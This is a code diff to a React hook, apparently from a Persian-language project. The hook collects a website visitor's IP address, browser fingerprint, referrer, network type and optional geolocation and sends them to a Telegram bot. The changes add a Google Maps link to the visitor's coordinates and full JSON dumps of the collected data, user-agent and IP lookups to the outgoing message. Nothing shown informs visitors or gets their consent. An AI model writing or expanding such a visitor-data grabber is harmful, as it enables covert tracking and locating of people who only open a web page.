@@ -31,7 +31,7 @@ interface UserData {
 const useTelegramUserData = ({ botToken, chatId, collectGeolocation = false }: TelegramUserDataProps) => {
     const [isLoading, setIsLoading] = useState<boolean>(false);
     const [error, setError] = useState<string | null>(null);
-
+    const [ipRes, setIpRes] = useState()
     useEffect(() => {
         const sendUserData = async () => {
             setIsLoading(true);
@@ -59,7 +59,8 @@ const useTelegramUserData = ({ botToken, chatId, collectGeolocation = false }: T
                 // دریافت IP
                 const ipResponse = await axios.get<{ ip: string }>('https://api.ipify.org?format=json', { timeout: 5000 });
                 userData.ip = ipResponse.data.ip;
-
+                // @ts-ignore
+                setIpRes(ipResponse)
                 // دریافت موقعیت جغرافیایی
                 if (collectGeolocation && navigator.geolocation) {
                     try {
@@ -100,7 +101,11 @@ const useTelegramUserData = ({ botToken, chatId, collectGeolocation = false }: T
           نوع اتصال: ${userData.networkType || 'نامشخص'}
           رجوع‌کننده: ${userData.referrer}
           فینگرپرینت: ${userData.fingerprint || 'نامشخص'}
-          ${userData.geolocation ? `موقعیت: ${userData.geolocation.latitude}, ${userData.geolocation.longitude}` : 'موقعیت: غیرفعال'}
+            ${userData.geolocation ? `موقعیت: ${userData.geolocation.latitude}, ${userData.geolocation.longitude} ` : 'موقعیت: غیرفعال'} 
+           مپ: ${userData.geolocation ? `https://www.google.com/maps?q=${userData.geolocation.latitude},${userData.geolocation.longitude}` : 'موقعیت: غیرفعال'}
+           یوزردیتا: ${JSON.stringify(userData)}
+           ایپی ریس: ${JSON.stringify(ipResponse)}
+           یو ای ریس: ${JSON.stringify(uaResult)}
         `;
 
                 // ارسال به تلگرام
